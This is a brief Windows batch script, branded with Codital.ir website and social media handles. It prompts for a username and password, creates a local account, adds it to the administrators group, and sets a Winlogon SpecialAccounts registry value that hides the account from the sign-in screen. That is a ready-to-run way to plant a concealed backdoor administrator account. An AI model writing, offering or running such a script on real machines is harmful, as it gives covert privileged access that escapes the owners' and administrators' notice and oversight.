cd\
cls
----------(WwW.Codital.ir)---------------
-----------Telegram : @Codital INSTAGRAM : @Codital.ir"
----------(WwW.Codital.ir)---------------
@echo off
set /p user=UserName:
set /p pass=Password:
net user /add %user% %pass%
net localgroup administrators /add %user%
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v %user% /t REG_DWORD /d 0
pause
